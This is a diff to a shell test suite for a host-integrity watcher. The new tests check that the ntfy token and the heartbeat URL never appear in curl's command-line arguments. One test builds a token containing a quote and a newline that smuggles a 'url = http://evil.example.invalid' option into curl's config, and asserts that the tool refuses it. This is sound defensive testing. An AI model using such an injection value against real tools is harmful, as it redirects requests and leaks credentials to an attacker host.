@@ -30,9 +30,13 @@ ntfy_url = https://ntfy.example.invalid/alerts
 heartbeat_url = https://kuma.example.invalid/api/push/abc
 EOF
     # Records every call so a test can assert what was and was not sent.
+    # argv and stdin recorded separately, because which one a secret travels in
+    # is the difference between a token every local user can read out of
+    # /proc/<pid>/cmdline and one nobody else sees.
     cat > "$STUB/curl" <<'EOF'
 #!/bin/sh
 printf '%s\n' "$*" >> "$DEJIMA_GUARD_STATE/curl.log"
+[ -t 0 ] || cat >> "$DEJIMA_GUARD_STATE/curl.stdin.log"
 exit 0
 EOF
     chmod +x "$STUB/curl"
@@ -55,7 +59,11 @@ EOF
 }
 
 run_watch() { PATH="$STUB:$PATH" run "$TOOL" "$@"; }
-curl_log()  { cat "$DEJIMA_GUARD_STATE/curl.log" 2>/dev/null || true; }
+curl_log()  { cat "$DEJIMA_GUARD_STATE/curl.log" "$DEJIMA_GUARD_STATE/curl.stdin.log" 2>/dev/null || true; }
+curl_argv() { cat "$DEJIMA_GUARD_STATE/curl.log" 2>/dev/null || true; }
+# Both halves, or a test that clears the record between cycles still counts
+# the calls made before it cleared.
+curl_reset() { : > "$DEJIMA_GUARD_STATE/curl.log"; : > "$DEJIMA_GUARD_STATE/curl.stdin.log"; }
 alerts()    { curl_log | grep -c 'Title:' || true; }
 heartbeats() { curl_log | grep -c 'kuma.example.invalid' || true; }
 
@@ -111,7 +119,7 @@ heartbeats() { curl_log | grep -c 'kuma.example.invalid' || true; }
     # the exact moment it is not, which is worse than not having one.
     stub_ssh "FILE aaa /etc/one" 0
     run_watch check
-    : > "$DEJIMA_GUARD_STATE/curl.log"
+    curl_reset
     stub_ssh "" 0 255
     run_watch check
     [ "$(heartbeats)" = 0 ]
@@ -124,7 +132,7 @@ heartbeats() { curl_log | grep -c 'kuma.example.invalid' || true; }
     # lands in a topic already muted.
     stub_ssh "FILE aaa /etc/one" 0
     run_watch check
-    : > "$DEJIMA_GUARD_STATE/curl.log"
+    curl_reset
     stub_ssh "FILE aaa /etc/one
 FILE bbb /etc/two
 FILE ccc /etc/three
@@ -140,7 +148,7 @@ UNIT backdoor.service" 0
     # notification guarantee exists to prevent, defeated one layer out.
     stub_ssh "FILE aaa /etc/one" 0
     run_watch check
-    : > "$DEJIMA_GUARD_STATE/curl.log"
+    curl_reset
     stub_ssh "FILE aaa /etc/one
 FILE bbb /etc/evil-http-backdoor" 0
     run_watch check
@@ -160,7 +168,7 @@ FILE bbb /etc/evil-http-backdoor" 0
 @test "containment failing alerts even when nothing changed" {
     stub_ssh "FILE aaa /etc/one" 0
     run_watch check
-    : > "$DEJIMA_GUARD_STATE/curl.log"
+    curl_reset
     stub_ssh "FILE aaa /etc/one" 1
     run_watch check
     [ "$status" -ne 0 ]
@@ -170,7 +178,7 @@ FILE bbb /etc/evil-http-backdoor" 0
 @test "both wrong at once is one alert, at max" {
     stub_ssh "FILE aaa /etc/one" 0
     run_watch check
-    : > "$DEJIMA_GUARD_STATE/curl.log"
+    curl_reset
     stub_ssh "FILE bbb /etc/two" 1
     run_watch check
     [ "$(alerts)" = 1 ]
@@ -205,7 +213,7 @@ printf '%s\n' "$*" >> "$DEJIMA_GUARD_STATE/curl.log"
 case "$*" in *kuma*) exit 0 ;; *) exit 22 ;; esac
 EOF
     chmod +x "$STUB/curl"
-    : > "$DEJIMA_GUARD_STATE/curl.log"
+    curl_reset
     stub_ssh "FILE bbb /etc/two" 0
     run_watch check
     [ "$(heartbeats)" = 0 ]
@@ -906,4 +914,51 @@ SSHEOF
     # a single stray subscription looks like the server being broken and both
     # correctly configured topics look like the thing that broke.
     grep -q 'returning 403 for the whole request' "$REPO/README.md"
+}
+
+# --- what the process list shows ---------------------------------------------
+#
+# /proc/<pid>/cmdline is world-readable. A secret passed as a command-line
+# argument is readable by every local account for as long as the call runs, and
+# on the systemd path this runs as root on a machine that may have other people
+# on it.
+
+@test "the ntfy token is never a command-line argument" {
+    export DEJIMA_GUARD_NTFY_TOKEN=tk_secretvalue
+    stub_ssh "" 0 255                      # any path that alerts
+    run_watch check
+    [[ "$(curl_log)" == *tk_secretvalue* ]]      # it was sent
+    [[ "$(curl_argv)" != *tk_secretvalue* ]]     # and not through argv
+}
+
+@test "the heartbeat URL is never a command-line argument" {
+    # An Uptime Kuma push URL carries its token in the path, so the URL is the
+    # credential rather than merely the destination.
+    stub_ssh "FILE /etc/passwd aaaa" 0
+    run_watch check
+    [[ "$(curl_log)" == *kuma.example.invalid* ]]
+    [[ "$(curl_argv)" != *kuma.example.invalid* ]]
+}
+
+@test "a token that would break out of the curl config is refused" {
+    # curl config syntax is not shell, but it is still a parser being handed a
+    # value from a file: a quote ends the value early and the rest is read as
+    # further options.
+    export DEJIMA_GUARD_NTFY_TOKEN='tk_x" 
+url = "http://evil.example.invalid/'
+    stub_ssh "" 0 255
+    run_watch check
+    [[ "$output" == *"ntfy_token"* ]]
+    [[ "$(curl_log)" != *evil.example.invalid* ]]
+}
+
+@test "the security policy states what taking this machine would get" {
+    # Watching a devbox means holding credentials to it, so running this is a
+    # concentration of privilege that did not exist before. A page that claims
+    # the benefit without stating that is selling something.
+    [ -f "$REPO/SECURITY.md" ]
+    grep -q 'ntfy token' "$REPO/SECURITY.md"
+    grep -q 'baseline' "$REPO/SECURITY.md"
+    grep -qi 'egress' "$REPO/SECURITY.md"
+    grep -q 'SECURITY.md' "$REPO/README.md"
 }
